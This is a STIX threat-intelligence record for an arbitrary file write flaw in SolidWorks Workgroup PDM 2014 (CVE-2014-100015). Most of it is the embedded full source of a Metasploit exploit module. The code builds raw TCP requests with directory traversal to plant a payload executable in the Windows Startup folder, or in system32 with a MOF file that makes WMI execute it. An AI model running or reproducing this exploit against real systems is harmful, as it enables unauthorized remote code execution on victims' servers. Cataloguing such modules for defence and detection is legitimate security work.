{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97a8d526-fddc-4bc2-acac-b4055311e86e",
    "created": "2024-08-14T16:46:07.09593Z",
    "modified": "2024-08-14T16:46:07.095934Z",
    "name": "SolidWorks Workgroup PDM 2014 pdmwService.exe Arbitrary File Write",
    "description": " This module exploits a remote arbitrary file write vulnerability in SolidWorks Workgroup PDM 2014 SP2 and prior.  For targets running Windows Vista or newer the payload is written to the startup folder for all users and executed upon next user logon.  For targets before Windows Vista code execution can be achieved by first uploading the payload as an exe file, and then upload another mof file which schedules WMI to execute the uploaded payload.  This module has been tested successfully on SolidWorks Workgroup PDM 2011 SP0 on Windows XP SP3 (EN) and Windows 7 SP1 (EN).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/solidworks_workgroup_pdmwservice_file_write.rb",
            "external_id": "solidworks_workgroup_pdmwservice_file_write.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-100015"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'SolidWorks Workgroup PDM 2014 pdmwService.exe Arbitrary File Write',\n      'Description'    => %q{\n        This module exploits a remote arbitrary file write vulnerability in\n        SolidWorks Workgroup PDM 2014 SP2 and prior.\n\n        For targets running Windows Vista or newer the payload is written to the\n        startup folder for all users and executed upon next user logon.\n\n        For targets before Windows Vista code execution can be achieved by first\n        uploading the payload as an exe file, and then upload another mof file,\n        which schedules WMI to execute the uploaded payload.\n\n        This module has been tested successfully on SolidWorks Workgroup PDM\n        2011 SP0 on Windows XP SP3 (EN) and Windows 7 SP1 (EN).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mohamed Shetta <mshetta[at]live.com>', # Initial discovery and PoC\n          'bcoles',  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE',   '2014-100015'],\n          ['EDB',   '31831'],\n          ['OSVDB', '103671']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested on:\n          # - SolidWorks Workgroup PDM 2011 SP0 (Windows XP SP3 - EN)\n          # - SolidWorks Workgroup PDM 2011 SP0 (Windows 7 SP1 - EN)\n          ['Automatic', { 'auto' => true } ], # both\n          ['SolidWorks Workgroup PDM <= 2014 SP2 (Windows XP SP0-SP3)', {}],\n          ['SolidWorks Workgroup PDM <= 2014 SP2 (Windows Vista onwards)', {}],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2014-02-22',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptInt.new('DEPTH', [true, 'Traversal depth', 10]),\n      Opt::RPORT(30000)\n    ])\n  end\n\n  #\n  # Check\n  #\n  def check\n    # op code\n    req  = \"\\xD0\\x07\\x00\\x00\"\n    # filename length\n    req << \"\\x00\\x00\\x00\\x00\"\n    # data length\n    req << \"\\x00\\x00\\x00\\x00\"\n    connect\n    sock.put req\n    res = sock.get_once\n    disconnect\n    if !res\n      vprint_error \"Connection failed\"\n      Exploit::CheckCode::Unknown\n    elsif res == \"\\x00\\x00\\x00\\x00\"\n      vprint_status \"Received reply (#{res.length} bytes)\"\n      Exploit::CheckCode::Detected\n    else\n      vprint_warning \"Unexpected reply (#{res.length} bytes)\"\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  #\n  # Send a file\n  #\n  def upload(fname, data)\n    # every character in the filename must be followed by 0x00\n    fname = fname.scan(/./).join(\"\\x00\") + \"\\x00\"\n    # op code\n    req  = \"\\xD0\\x07\\x00\\x00\"\n    # filename length\n    req << \"#{[fname.length].pack('V')}\"\n    # file name\n    req << \"#{fname}\"\n    # data length\n    req << \"#{[data.length].pack('V')}\"\n    # data\n    req << \"#{data}\"\n    connect\n    sock.put req\n    res = sock.get_once\n    disconnect\n    if !res\n      fail_with(Failure::Unknown, \"#{peer} - Connection failed\")\n    elsif res == \"\\x00\\x00\\x00\\x00\"\n      print_status \"Received reply (#{res.length} bytes)\"\n    else\n      print_warning \"Unexpected reply (#{res.length} bytes)\"\n    end\n  end\n\n  #\n  # Exploit\n  #\n  def exploit\n    depth    = '..\\\\' * datastore['DEPTH']\n    exe      = generate_payload_exe\n    exe_name = \"#{rand_text_alpha(rand(10) + 5)}.exe\"\n    if target.name =~ /Automatic/ or target.name =~ /Vista/\n      print_status(\"Writing EXE to startup for all users (#{exe.length} bytes)\")\n      upload(\"#{depth}\\\\Users\\\\All Users\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\#{exe_name}\", exe)\n    end\n    if target.name =~ /Automatic/ or target.name =~ /XP/\n      print_status(\"Sending EXE (#{exe.length} bytes)\")\n      upload(\"#{depth}\\\\WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n      mof_name = \"#{rand_text_alpha(rand(10) + 5)}.mof\"\n      mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))\n      print_status(\"Sending MOF (#{mof.length} bytes)\")\n      upload(\"#{depth}\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n      register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{::File.basename(mof_name)}\")\n    end\n    register_file_for_cleanup(\"#{::File.basename(exe_name)}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-22",
    "x_mitre_platforms": [
        "win'"
    ]
}